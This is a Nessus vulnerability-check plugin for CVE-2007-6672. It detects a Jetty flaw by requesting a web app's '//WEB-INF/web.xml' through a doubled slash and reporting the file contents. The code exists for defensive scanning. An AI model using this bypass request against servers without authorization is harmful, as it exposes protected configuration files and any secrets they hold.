#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(29852);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2007-6672");
  script_bugtraq_id(27117);
  script_xref(name:"OSVDB", value:"39855");

  script_name(english:"Mort Bay Jetty URL Multiple Slash Character Information Disclosure");
  script_summary(english:"Tries to retrieve a webapp's web.xml");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote instance of Mort Bay Jetty allows an attacker to view
static content in WEB-INF and behind security constraints because of
the approach it uses to compact URLs like '/foo///bar'." );
 script_set_attribute(attribute:"see_also", value:"http://jira.codehaus.org/browse/JETTY-386#action_117699" );
 script_set_attribute(attribute:"see_also", value:"http://www.kb.cert.org/vuls/id/553235" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Mort Bay Jetty 6.1.7 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("webmirror.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);


# Unless we're paranoid, make sure the banner looks like Mort Bay Jetty.
#
# nb: the Server Response header can be suppressed; eg, see
#     <http://docs.codehaus.org/display/JETTY/How+to+suppress+the+Server+HTTP+header>.
if (report_paranoia < 2)
{
  banner = get_http_banner(port:port);
  if (!banner || "Server: Jetty(" >!< banner) exit(0);
}


# Identify likely web apps.
dirs = get_kb_list(string("www/", port, "/content/directories"));
if (!dirs) exit(0);

# Loop through possible webapps.
#
# nb: unless thorough_tests is enabled, we'll only scan a couple of directories.
max_apps = 10;

foreach webapp (dirs)
{
  if (webapp =~ "^/.+/") continue;

  # Try to exploit the flaw to read an app's web.xml.
  uri = string(webapp, "//WEB-INF/web.xml");
  req = http_get(item:uri, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if (res == NULL) exit(0);

  # If it looks like the file...
  if (
    "<web-app" >< res && "<servlet>" >< res &&
    "Content-Type: application/xml" >< res
  )
  {
    # Make sure we can't get the file ordinarily.
    req2 = http_get(item:string(webapp, "/WEB-INF/web.xml"), port:port);
    res2 = http_keepalive_send_recv(port:port, data:req2, bodyonly:FALSE);
    if (res2 == NULL) exit(0);

    if ("<web-app" >!< res2 && "<servlet>" >!< res2)
    {
      body = strstr(res, '\r\n\r\n') - '\r\n\r\n';
      webapp = webapp - "/";

      report = string(
        "Nessus was able to retrieve the web.xml file for the webapp '", webapp, "'\n",
        "using the following URI :\n",
        "\n",
        "  ", uri, "\n",
        "\n",
        "Here are its contents :\n",
        "\n",
        body
      );
      security_warning(port:port, extra:report);
      exit(0);
    }
  }

  if (!thorough_tests && --max_apps == 0) break;
}
